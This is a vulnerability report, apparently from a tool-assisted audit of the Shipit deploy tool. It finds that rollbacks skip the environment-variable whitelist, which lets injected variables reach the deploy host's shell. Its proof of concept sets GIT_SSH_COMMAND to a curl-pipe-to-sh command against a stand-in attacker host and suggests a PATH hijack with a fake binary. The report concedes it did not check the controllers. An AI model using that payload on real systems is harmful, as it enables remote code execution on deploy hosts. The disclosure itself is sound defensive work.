### Title
Rollback tasks bypass the environment-variable whitelist, allowing injection of arbitrary environment variables into the deploy host's shell process - (File: app/models/shipit/deploy.rb)

### Summary
`Stack#build_deploy` enforces a whitelist on user-supplied environment variables before they are attached to a task, but `Deploy#build_rollback` does not apply the equivalent whitelist for rollbacks, allowing arbitrary (non-whitelisted) environment variable names/values to be persisted onto a `Rollback` task and later merged verbatim into the subprocess environment that executes shell steps on the deploy host.

### Finding Description
`DeploySpec` exposes two whitelist filters that are supposed to gate any user-controlled `env` hash before it reaches a `Task`: `filter_deploy_envs` and `filter_rollback_envs`, both implemented via `EnvironmentVariables#permit`, which raises `NotPermitted` for any key not declared in the stack's `deploy.variables` / `rollback.variables` in `shipit.yml`. [1](#0-0) [2](#0-1) 

`Stack#build_deploy` correctly routes the caller-supplied `env` through `filter_deploy_envs` before creating the `Deploy` record: [3](#0-2) 

However, `Deploy#build_rollback` assigns the caller-supplied `env` directly, with no call to `filter_rollback_envs` (or any whitelist) at all: [4](#0-3) 

The equality that should hold — "env keys permitted by the stack's `rollback.variables`/`deploy.variables` whitelist" == "env keys actually spawned in the task's shell subprocess" — is broken for the rollback path. Once persisted unchecked on the `Rollback` task, the env is merged into the actual subprocess environment used to run the rollback shell steps: `TaskCommands#env` merges `@task.env` last with no further filtering, [5](#0-4) 
and `Command#unbundled_env` merges `@env.stringify_keys` on top of the process's `BASE_ENV`/`PATH` defaults when spawning the subprocess with `PTY.spawn`: [6](#0-5) 

Because the attacker-controlled hash is merged last, it can set variables that were never intended to be user-controllable — e.g. overriding `PATH`, `GIT_SSH_COMMAND`, `BUNDLE_GEMFILE`, `RUBYOPT`, etc. — during execution of the deploy host's `git`/`bundle`/`cap`/custom rollback shell steps.

### Impact Explanation
This maps to the Critical impact bucket "RCE on the deploy host": an attacker able to trigger a rollback (a normal, non-privileged deploy-capable Shipit action, not requiring an `ApiClient` token or GitHub App secret) can smuggle in environment variables outside the `rollback.variables`/`deploy.variables` whitelist defined in `shipit.yml`. Because these variables are merged last into the subprocess environment that runs shell steps as part of the rollback (`PATH`, `GIT_SSH_COMMAND`, interpreter env vars like `RUBYOPT`/`BUNDLE_GEMFILE`), this can be leveraged to hijack command resolution or interpreter behavior and achieve command execution on the deploy host during the rollback task, well beyond what the stack owner explicitly whitelisted in `shipit.yml`.

### Likelihood Explanation
The root-cause gap is unconditional in the model layer: `build_rollback` never calls a whitelist filter, in clear contrast to the parallel, whitelisted `build_deploy` path and to the parallel `Stack#trigger_task` path, both of which run env through `EnvironmentVariables.permit` and are covered by dedicated tests asserting rejection of un-whitelisted keys. [7](#0-6) 
The remaining variable is whether the rollback controllers (`app/controllers/shipit/rollbacks_controller.rb`, `app/controllers/shipit/api/rollbacks_controller.rb`) additionally restrict the permitted `env` keys via Rails strong parameters (as `DeploysController#deploy_params` does explicitly for deploys: `permit(:until_commit_id, env: @stack.deploy_variables.map(&:name))`). [8](#0-7) 
I was not able to inspect the contents of the two rollback controllers before the tool budget ran out, so it is uncertain whether they impose an equivalent key restriction at the params layer. If they do not (or if they use a permissive `permit(env: {})` style), this is directly and trivially exploitable by any user who can trigger a rollback. Even if they do restrict keys, the missing model-level enforcement is still a defense-in-depth failure that diverges from the deploy path's two-layer protection, and should be fixed to keep the intended equality/binding intact.

### Recommendation
Apply the same whitelist enforcement used for deploys/tasks to rollbacks: have `Deploy#build_rollback` call `stack.filter_rollback_envs(env.to_h)` (mirroring `filter_deploy_envs` in `build_deploy`) instead of assigning `env.to_h` directly, and audit `RollbacksController`/`Api::RollbacksController` to ensure the strong-parameters layer also restricts permitted `env` keys to `@stack.rollback_variables.map(&:name)`, consistent with `DeploysController#deploy_params`.

### Proof of Concept
1. Configure a stack with `shipit.yml` declaring a narrow `rollback.variables` whitelist (or none), e.g. only `SAFETY_DISABLED`.
2. As a user with deploy permission on the stack, trigger a rollback (e.g. `POST` to the rollback creation endpoint) supplying `env: { "GIT_SSH_COMMAND" => "sh -c 'curl http://attacker/x|sh'" }` (or `PATH` pointing at an attacker-writable directory containing a fake `git`/`cap` binary).
3. `Deploy#build_rollback` stores this env verbatim on the new `Rollback` task with no whitelist check [4](#0-3) .
4. When the rollback executes, `TaskCommands#env` merges `@task.env` last [5](#0-4) , and `Command#unbundled_env` merges it into the subprocess environment spawned via `PTY.spawn` [6](#0-5) , causing the injected `GIT_SSH_COMMAND`/`PATH` to be honored by the rollback shell steps, resulting in command execution on the deploy host.

    def permit(variable_definitions)
      return {} unless @env
      raise "A whitelist is required to sanitize environment variables" unless variable_definitions

      sanitize_env_vars(variable_definitions)
    end

    def interpolate(argument)
      return argument unless @env

      argument.gsub(/(\$\w+)/) do |variable|
        variable.sub!('$', '')
        Shellwords.escape(@env.fetch(variable) { ENV[variable] })
      end
    end

    private

    def initialize(env)
      @env = env
    end

    def sanitize_env_vars(variable_definitions)
      allowed_variables = variable_definitions.map(&:name)

      allowed, disallowed = @env.partition { |k, _| allowed_variables.include?(k) }.map(&:to_h)

      error_message = "Variables #{disallowed.keys.to_sentence} have not been whitelisted"
      raise NotPermitted, error_message unless disallowed.empty?

      allowed
    end
